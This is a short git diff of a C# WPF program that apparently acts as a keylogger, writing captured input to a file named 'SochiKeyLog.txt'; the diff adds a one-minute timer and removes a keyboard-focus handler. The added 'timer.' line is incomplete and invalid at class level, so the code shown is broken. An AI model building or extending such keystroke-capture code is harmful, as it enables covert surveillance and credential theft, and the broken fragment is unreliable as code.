@@ -16,14 +16,14 @@ using System.IO;
 using System.Drawing;
 using System.Runtime.InteropServices;
 using System.ComponentModel;
-using System.Threading;
-
-
+using System.Timers;
 
 namespace WpfApplication8
 {
     public partial class MainWindow : Window
     {
+        Timer timer = new Timer(60000);
+        timer.
         bool condition = false;                                         //variables and importants actions
         StreamWriter file = new StreamWriter(@"SochiKeyLog.txt");
         /// <summary>
@@ -261,10 +261,6 @@ namespace WpfApplication8
             }
         }
 
-        private void Window_GotKeyboardFocus(object sender, KeyboardFocusChangedEventArgs e)
-        {
-            Keyboard.Focus(MainWindow);
-        }
     }
 }
 
